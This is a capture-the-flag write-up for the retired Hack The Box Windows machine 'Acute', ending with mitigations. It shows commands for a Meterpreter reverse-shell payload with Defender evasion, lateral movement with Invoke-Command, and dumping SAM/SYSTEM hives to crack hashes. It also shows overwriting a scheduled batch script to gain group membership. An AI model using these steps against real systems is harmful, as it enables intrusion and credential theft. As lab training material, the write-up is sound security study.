---
machine: Acute
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, powershell-web-access, meterpreter, defender-bypass, lateral-movement, hive-dump, privesc]
---

# Acute — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The only exposed service is HTTPS on `443`, an ASP.NET site for a fictional company. The page publishes `New_Starter_CheckList_v7.docx`, whose properties reveal the username format and a default password. That convention gets a login on PowerShell Web Access (PSWA) as `edavies` on `Acute-PC01`. A Meterpreter payload requires bypassing Defender before execution. From there the box is a chain of credentials and restricted PowerShell endpoints: `Invoke-Command` to `ATSSERVER` as `imonks`, a modifiable script that yields access as `jmorgan`, and `awallace`'s hive dump to crack the hash and reuse the password. `keepmeon.bat`, run by Lois every five minutes, adds `awallace` to `Site_Admin`.

## Reconnaissance

```bash
nmap -Pn -sCV -p443 <IP>
```

- `443` Microsoft HTTPAPI httpd 2.0, ASP.NET site.
- The certificate and content point to a corporate intranet; there is no plain HTTP.
- The site lists staff: `awallace`, `chall`, `edavies`, `imonks`, `jmorgan` and `lhopkins`.

```bash
feroxbuster -u https://<IP> -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The paths include the PSWA login (`/pswa`) and the downloads area with the welcome document.

## Enumeration

```bash
wget --no-check-certificate https://<IP>/New_Starter_CheckList_v7.docx
unzip -o New_Starter_CheckList_v7.docx -d docx
cat docx/docProps/core.xml
grep -ri "password\|user\|account" docx/word/
```

The DOCX properties identify the author and the username format (`initial` + surname), and the content includes an initial password the company never rotated. The site's staff list provides candidates to try on PSWA.

The PSWA form asks for user, password and computer name. `Acute-PC01` accepts `edavies`' credentials; `ATSSERVER` is the second host on the network.

## Foothold

The PSWA session is a limited PowerShell console, enough to run commands and download files. For a stable session, a Meterpreter payload is generated:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -f exe -o update.exe
```

Defender blocks the first upload. After identifying the signature and obfuscating the binary (encryption plus in-memory execution), the payload is uploaded and run, and the Meterpreter session allows migrating to a stable process and opening PowerShell.

## Lateral movement

The first hop uses the restricted PowerShell endpoints. From `edavies` the available configurations and credentials on `ATSSERVER` are enumerated:

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName <ENDPOINT> -ScriptBlock { whoami; hostname } -Credential $cred
```

`imonks`' credentials give execution on `ATSSERVER`. There it is confirmed to be a container or VM, WinPEAS is run and `screenshare` is reviewed, exposing the user's screen and credentials.

The next user is `jmorgan` on `Acute-PC01`. The shell is limited, but `Program Files` and the desktop are readable; a script the user runs periodically can be modified to launch commands in their context.

The last hop is `awallace` on `ATSSERVER`. In that context the registry hives are saved and the hashes extracted:

```powershell
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
hashcat -m 1000 <HASH> /usr/share/wordlists/rockyou.txt
```

The cracked password is reused for access as `awallace`.

## Privilege escalation

`awallace` can read `C:\program files\keepmeon`. It contains `keepmeon.bat`, a script Lois runs every five minutes on `ATTSERVER`. The directory is writable, so its content is replaced with an instruction that adds the user to the site administrators group:

```powershell
Set-Content -Path 'C:\program files\keepmeon\keepmeon.bat' -Value 'net group site_admin awallace /add /domain'
```

When the script runs, `awallace` joins `Site_Admin`. That membership grants access to the administration panel and to the host with elevated rights, the final objective of the box.

## Evidence

- `New_Starter_CheckList_v7.docx` with metadata and initial password.
- Successful login at `/pswa` as `edavies` on `Acute-PC01`.
- Meterpreter payload blocked by Defender and executed after the bypass.
- Execution on `ATSSERVER` as `imonks` through `Invoke-Command`.
- SAM/SYSTEM/SECURITY hives and `awallace`'s cracked hash.
- Modified `keepmeon.bat` and membership in `Site_Admin`.

## Lessons learned

- Metadata in a public document can leak the username format and default credentials.
- PSWA is a full entry point even without exposed RDP or SMB.
- Defender does not prevent execution; it only forces payload obfuscation.
- Restricted PowerShell endpoints allow host-to-host hops without an exploit.
- A writable directory holding a privileged script is a direct escalation.

## Mitigations and detection

- Remove documents with internal metadata and initial passwords from the web; rotate them when accounts are created.
- Restrict PSWA by network and require MFA; limit `Invoke-Command` endpoints to what is strictly needed.
- Review Defender exclusions and alert on processes loading payloads in memory.
- Remove write permissions on directories containing scripts run by other users.
- Audit privileged group changes and child processes spawned by `keepmeon.bat`.

## References

- [0xdf — Acute](https://0xdf.gitlab.io/2022/07/16/htb-acute.html)
- [IppSec — Acute](https://www.youtube.com/watch?v=jDYte7xNY1g)
- [Hack The Box — Acute](https://app.hackthebox.com/machines/acute)
